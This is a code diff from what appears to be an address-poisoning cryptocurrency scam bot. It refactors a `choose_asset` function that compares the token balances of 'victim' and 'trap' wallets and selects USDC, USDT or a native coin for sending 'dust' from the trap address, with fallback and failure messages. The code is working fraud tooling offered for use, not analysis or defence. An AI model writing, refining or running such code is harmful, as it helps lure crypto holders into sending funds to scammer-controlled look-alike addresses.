@@ -287,12 +287,9 @@ def get_token_balance(address, token_symbol):
         logger.warning(f"Failed to get token balance for {address}: {e}")
         return 0
 
-# ─── Modified choose_asset with detailed messaging support ───
 def choose_asset(victim, trap, preferred_asset=None):
     victim_usdc = get_token_balance(victim, "USDC")
     trap_usdc = get_token_balance(trap, "USDC")
-    victim_usdc_native = get_token_balance(victim, "USDC_NATIVE")
-    trap_usdc_native = get_token_balance(trap, "USDC_NATIVE")
     
     victim_usdt = get_token_balance(victim, "USDT")
     trap_usdt = get_token_balance(trap, "USDT")
@@ -314,48 +311,57 @@ def choose_asset(victim, trap, preferred_asset=None):
     usdc_ok = trap_usdc >= usdc_dust and (victim_usdc > 0 or force_stable)
     usdt_ok = trap_usdt >= usdt_dust and (victim_usdt > 0 or force_stable)
 
-    # 1. Try preferred asset first
-    if preferred_asset:
-        pref_upper = preferred_asset.upper()
-        if pref_upper == "USDC" and usdc_ok:
-            msg = f"ℹ️ Using USDC because trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)})." if not usdt_ok else None
-            return ("USDC", usdc_dust, msg)
-        elif pref_upper == "USDT" and usdt_ok:
-            msg = f"ℹ️ Using USDT because trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)})." if not usdc_ok else None
-            return ("USDT", usdt_dust, msg)
-        elif pref_upper == NATIVE_SYMBOL and trap_native_bal >= DUST_AMOUNT.get(NATIVE_SYMBOL, 0):
-            return (NATIVE_SYMBOL, DUST_AMOUNT.get(NATIVE_SYMBOL, 0), None)
+    pref_upper = preferred_asset.upper() if preferred_asset else None
+    native_dust = DUST_AMOUNT.get(NATIVE_SYMBOL, 0)
+    native_ok = trap_native_bal >= native_dust
 
-    # 2. Fallback to USDC
+    # 1. Try preferred asset first
+    if pref_upper == NATIVE_SYMBOL and native_ok:
+        return (NATIVE_SYMBOL, native_dust, None)
+    elif pref_upper == "USDC" and usdc_ok:
+        return ("USDC", usdc_dust, None)
+    elif pref_upper == "USDT" and usdt_ok:
+        return ("USDT", usdt_dust, None)
+
+    # 2. Build explicit fallback notification message if preferred asset was unavailable
+    fallback_reason = None
+    if pref_upper == NATIVE_SYMBOL and not native_ok:
+        fallback_reason = f"preferred native asset {NATIVE_SYMBOL} balance ({fmt(trap_native_bal, 18)}) is below dust threshold ({fmt(native_dust, 18)})"
+    elif pref_upper == "USDC" and not usdc_ok:
+        fallback_reason = f"preferred USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below dust threshold ({fmt(usdc_dust, usdc_decimals)})"
+    elif pref_upper == "USDT" and not usdt_ok:
+        fallback_reason = f"preferred USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below dust threshold ({fmt(usdt_dust, usdt_decimals)})"
+
+    # 3. Fallback to USDC
     if usdc_ok:
-        msg = f"ℹ️ Using USDC because trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)})." if (preferred_asset and preferred_asset.upper() == "USDT" and not usdt_ok) else None
+        msg = f"ℹ️ Falling back to USDC because {fallback_reason}." if fallback_reason else None
         return ("USDC", usdc_dust, msg)
 
-    # 3. Fallback to USDT
+    # 4. Fallback to USDT
     if usdt_ok:
-        msg = f"ℹ️ Using USDT because trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)})." if (preferred_asset and preferred_asset.upper() == "USDC" and not usdc_ok) else None
+        msg = f"ℹ️ Falling back to USDT because {fallback_reason}." if fallback_reason else None
         return ("USDT", usdt_dust, msg)
 
-    # 4. Neither is ok. Build detailed error message.
+    # 5. Fallback to Native (if wasn't preferred originally but is valid)
+    if native_ok:
+        msg = f"ℹ️ Falling back to {NATIVE_SYMBOL} because {fallback_reason}." if fallback_reason else None
+        return (NATIVE_SYMBOL, native_dust, msg)
+
+    # 6. Detailed failure reporting if no assets are available
     reasons = []
-    
+    if not native_ok:
+        reasons.append(f"Trap {NATIVE_SYMBOL} balance ({fmt(trap_native_bal, 18)}) is below threshold ({fmt(native_dust, 18)}).")
     if trap_usdc < usdc_dust:
-        reasons.append(f"Trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below the dust threshold ({fmt(usdc_dust, usdc_decimals)}).")
+        reasons.append(f"Trap USDC balance ({fmt(trap_usdc, usdc_decimals)}) is below threshold ({fmt(usdc_dust, usdc_decimals)}).")
     elif victim_usdc == 0 and not force_stable:
         reasons.append("Victim has 0 USDC balance.")
         
     if trap_usdt < usdt_dust:
-        reasons.append(f"Trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below the dust threshold ({fmt(usdt_dust, usdt_decimals)}).")
+        reasons.append(f"Trap USDT balance ({fmt(trap_usdt, usdt_decimals)}) is below threshold ({fmt(usdt_dust, usdt_decimals)}).")
     elif victim_usdt == 0 and not force_stable:
         reasons.append("Victim has 0 USDT balance.")
 
-    if preferred_asset and preferred_asset.upper() == NATIVE_SYMBOL:
-        native_dust = DUST_AMOUNT.get(NATIVE_SYMBOL, 0)
-        if trap_native_bal < native_dust:
-            reasons.append(f"Preferred native asset {NATIVE_SYMBOL} balance ({fmt(trap_native_bal, 18)}) is below the dust threshold ({fmt(native_dust, 18)}).")
-
-    error_msg = "❌ No suitable stablecoin found to send dust.\nDetails:\n" + "\n".join([f"• {r}" for r in reasons]) if reasons else "❌ No suitable stablecoin found."
-    
+    error_msg = "❌ No suitable asset found to send dust.\nDetails:\n" + "\n".join([f"• {r}" for r in reasons])
     return (None, 0, error_msg)
 
 _last_low_balance_alert = {}
